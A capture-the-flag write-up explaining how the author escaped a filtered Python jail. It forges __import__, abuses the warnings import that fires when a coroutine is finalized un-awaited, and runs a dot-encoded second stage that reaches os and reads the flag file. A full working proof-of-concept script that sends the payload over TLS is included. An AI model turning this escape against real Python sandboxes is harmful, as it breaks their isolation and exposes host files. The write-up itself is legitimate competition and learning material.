# build-a-builtin-revenge — Full Writeup
**Category:** Jail

## Description

> jail/build-a-builtin-revenge
> 8 solves / 488 points
> oh_word
> Flag format: bctf{...}

## Overview

This challenge is a Python jail running CPython 3.14 with a strong stage-1 filter:

- rejects any input containing `.`
- rejects any input containing `import` or `match`
- clears `builtins.__dict__`
- runs `exec(code, {"set_builtin": set_builtin}, {})`

So direct attribute traversal and standard import usage are blocked in stage-1.

The final winning path was not a classic parser trick, but a runtime side-effect path:

1. Build a forged `__import__` using `set_builtin("__im"+"port__", I)`.
2. Create an un-awaited coroutine (`async def f(): pass; c=f()`).
3. During coroutine finalization, CPython warning machinery triggers an internal import (`warnings`) and invokes our callback `I(*a)`.
4. In that callback context, `a[1]` provides a strong globals mapping with `exec`.
5. Use `a[1]["exec"](...)` to run a second-stage payload where dots are encoded as `\x2e` to bypass stage-1 filtering.
6. Traverse object graph to `sys.modules["os"]`, read randomized `/flag-<32hex>.txt`, leak bytes via traceback.

Recovered flag:

`bctf{congratulations_ctf_agent_14_from_solver_swarm_5_for_solving_this_challenge_c5ae58de}`

## Technical details

### Jail behavior

Core logic:

```python
code = input("code > ")

if "." in code:
    print("Nuh uh")
    exit(1)

if "import" in code or "match" in code:
    print("Slopadoodledoo")
    exit(1)

def set_builtin(key, val):
    builtins.__dict__[key] = val

exec = exec
builtins.__dict__.clear()
exec(code, {"set_builtin": set_builtin}, {})
```

Important nuance: globals/locals are split (`globals={"set_builtin":...}`, `locals={}`), which affects where names land and what closures see.

### Why earlier branches were dropped

- **Template/t-string constructor hijack**: construction uses intrinsic VM/C path; not controlled by setting builtin `Template`.
- **Class annotation leak**: useful for sandbox/classdict introspection but insufficient by itself for host execution.
- **TypeAlias/lazy eval probes**: no stable direct primitive to host globals under this filter set.

### Winning primitive

The key was the **import callback context** reached through coroutine finalization warning path.

Minimal context probe:

```python
def I(*a):
    assert 0,(a[0],("exec" in a[1]))
set_builtin("__im"+"port__",I)
async def f():
 pass
c=f()
```

This shows callback for `"warnings"` and `exec` visibility in callback globals.

### Stage-2 strategy

Stage-2 needs dot syntax (`.__class__`, `.__subclasses__`, `.__globals__`, etc.), but stage-1 bans literal dots.
So stage-2 source is injected as a string with dots replaced by `\x2e`.

Stage-2 logic:

1. Find `FileFinder` in `object.__subclasses__()`.
2. Read `FileFinder.__init__.__globals__` to recover `sys`.
3. Get `os` from `sys.modules["os"]`.
4. Enumerate `/`, locate `flag-*.txt`.
5. Open/read file and leak with `assert 0,D`.

## Proof-of-Concept

```python
#!/usr/bin/env python3
import re
import ssl
import time
import socket

HOST = "build-a-builtin-revenge.opus4-7.b01le.rs"
PORT = 8443

stage2 = (
    'S=[c for c in (1).__class__.__mro__[1].__subclasses__() if c.__name__=="FileFinder"][0]\n'
    'G=S.__init__.__globals__\n'
    'O=G["sys"].modules["os"]\n'
    'N=[x for x in O.listdir("/") if x.startswith("flag-")][0]\n'
    'F=O.open("/"+N,0)\n'
    'D=O.read(F,200)\n'
    'assert 0,D'
)

stage2_enc = stage2.replace(".", "\\x2e").replace('"', '\\"').replace("\n", "\\n")

payload = (
    'def I(*a):\r '
    'a[1]["exec"]("' + stage2_enc + '",a[1],a[1])\r '
    'return 0\r'
    'set_builtin("__im"+"port__",I)\r'
    'async def f():\r '
    'pass\r'
    'c=f()'
)

probe_payload = (
    'def I(*a):\r '
    'assert 0,7\r'
    'set_builtin("__im"+"port__",I)\r'
    'async def f():\r '
    'pass\r'
    'c=f()'
)

assert "." not in payload
assert "import" not in payload
assert "match" not in payload

ctx = ssl.create_default_context()

def send_payload(src: str, seconds: int = 15) -> bytes:
    out = b""
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as s:
            s.recv(1024)  # code >
            s.sendall(src.encode() + b"\n")
            end = time.time() + seconds
            while time.time() < end:
                s.settimeout(2)
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    out += chunk
                except TimeoutError:
                    continue
    return out

flag = None
for attempt in range(1, 11):
    # warm-up helps callback path reliability
    send_payload(probe_payload, 8)
    out = send_payload(payload, 20)
    m = re.search(rb"bctf\{[^}]+\}", out)
    print(f"[attempt {attempt}] recv_bytes={len(out)} flag={bool(m)}")
    if m:
        print(out.decode("latin1", "replace"))
        flag = m.group(0).decode("latin1", "replace")
        break
    time.sleep(0.2)

print("FLAG:", flag if flag else "not found")
```

## P/S

- Final flag:
  `bctf{congratulations_ctf_agent_14_from_solver_swarm_5_for_solving_this_challenge_c5ae58de}`
- If you get `FLAG: not found`, rerun; the callback output is asynchronous and can be timing-sensitive.
- The biggest trap in this challenge is assuming all import callbacks are equivalent; many paths only expose sandbox globals. The coroutine-finalization warning path is the one that gave a practical execution primitive.